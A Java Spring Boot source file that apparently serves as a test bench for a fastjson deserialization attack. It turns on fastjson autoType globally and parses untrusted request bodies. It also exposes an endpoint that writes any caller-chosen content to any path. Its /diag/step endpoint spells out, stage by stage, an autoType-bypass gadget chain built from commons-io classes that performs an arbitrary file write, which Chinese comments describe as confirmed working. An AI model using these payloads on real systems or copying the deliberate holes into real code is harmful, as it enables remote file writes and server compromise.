package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] header[0..80]={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok-no-x5c");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={} preview={}", json.length(), json.substring(0, Math.min(120, json.length())));
            JSONObject result = JSONObject.parseObject(json);
            log.info("[RAW] parsed keys={}", result == null ? "null" : result.keySet());
            // 检查各字段是否被正确实例化
            if (result != null) {
                Object input = result.get("input");
                Object branch = result.get("branch");
                Object trigger = result.get("trigger");
                log.info("[RAW] input={}", input == null ? "NULL" : input.getClass().getName());
                log.info("[RAW] branch={}", branch == null ? "NULL" : branch.getClass().getName());
                log.info("[RAW] trigger={}", trigger == null ? "NULL" : trigger.getClass().getName());

                // 如果 TeeInputStream 被实例化了，检查其内部字段
                if (trigger != null) {
                    try {
                        // 反射查看 XmlStreamReader 内部状态
                        log.info("[RAW] trigger class={}", trigger.getClass().getName());
                    } catch (Exception ex) {
                        log.warn("[RAW] reflect err: {}", ex.getMessage());
                    }
                }
            }
            r.put("ok", true);
            r.put("keys", result == null ? "null" : result.keySet().toString());
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            // 打印完整堆栈到日志
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            log.error("[RAW-STACK]\n{}", sw.toString());
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * 纯 Java 验证写链（已确认可用）
     */
    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            CharSequenceReader csReader = new CharSequenceReader(padded);
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(csReader, cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192];
            while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
            log.info("[CHAIN] wrote {} ok", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * 逐层测试 fastjson 能否实例化链中各个类
     * POST {"step": "1"/"2"/"3"/"4", "file": "/tmp/x"}
     *
     * step=1  仅测试 ReaderInputStream（最简单，无 branch）
     * step=2  测试 LockableFileWriter 实例化
     * step=3  测试 WriterOutputStream 包含 LockableFileWriter
     * step=4  测试 TeeInputStream 通过 $ref 引用 input/branch
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "1");
        String file = body.getOrDefault("file", "/tmp/step_test");
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json;
            switch (step) {
                case "1":
                    // ReaderInputStream 独立实例化
                    json = "{\"@type\":\"java.lang.AutoCloseable\"," +
                           "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\"," +
                           "\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\"," +
                           "\"charSequence\":\"hello world\"}," +
                           "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1}";
                    break;
                case "2":
                    // LockableFileWriter 独立实例化
                    json = "{\"@type\":\"java.lang.AutoCloseable\"," +
                           "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\"," +
                           "\"file\":\"" + file + "\"," +
                           "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false}";
                    break;
                case "3":
                    // WriterOutputStream 包含 LockableFileWriter
                    json = "{\"@type\":\"java.lang.AutoCloseable\"," +
                           "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\"," +
                           "\"writer\":{\"@type\":\"org.apache.commons.io.output.LockableFileWriter\"," +
                           "\"file\":\"" + file + "\",\"encoding\":\"iso-8859-1\"," +
                           "\"lockDir\":\"/tmp\",\"append\":false}," +
                           "\"charset\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}";
                    break;
                case "4":
                    // 完整链用 JSONObject 包裹，测试 $ref 引用
                    json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\"," +
                           "\"input\":{\"@type\":\"java.lang.AutoCloseable\"," +
                           "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\"," +
                           "\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\"," +
                           "\"charSequence\":\"STEP4-TEST" + " ".repeat(8183) + "\"}," +
                           "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1}," +
                           "\"branch\":{\"@type\":\"java.lang.AutoCloseable\"," +
                           "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\"," +
                           "\"writer\":{\"@type\":\"org.apache.commons.io.output.LockableFileWriter\"," +
                           "\"file\":\"" + file + "\",\"encoding\":\"iso-8859-1\"," +
                           "\"lockDir\":\"/tmp\",\"append\":false}," +
                           "\"charset\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}," +
                           "\"trigger\":{\"@type\":\"java.lang.AutoCloseable\"," +
                           "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\"," +
                           "\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\"," +
                           "\"input\":{\"$ref\":\"$.input\"}," +
                           "\"branch\":{\"$ref\":\"$.branch\"}," +
                           "\"closeBranch\":true}," +
                           "\"httpContentType\":\"text/xml\",\"lenient\":true," +
                           "\"defaultEncoding\":\"iso-8859-1\"}}";
                    break;
                default:
                    r.put("ok", false); r.put("msg", "step must be 1-4");
                    return r;
            }

            log.info("[STEP{}] json len={} preview={}", step, json.length(), json.substring(0, Math.min(100, json.length())));
            Object result = JSONObject.parseObject(json);
            log.info("[STEP{}] ok, result type={}", step, result == null ? "null" : result.getClass().getName());

            // step4 额外检查文件
            if ("4".equals(step)) {
                File f = new File(file);
                log.info("[STEP4] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                r.put("fileExists", f.exists());
                r.put("fileSize", f.exists() ? f.length() : -1);
            }

            r.put("ok", true);
            r.put("resultType", result == null ? "null" : result.getClass().getName());

        } catch (Exception e) {
            log.error("[STEP{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP{}-STACK]\n{}", step, sw.toString());
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
        }
        return r;
    }
}
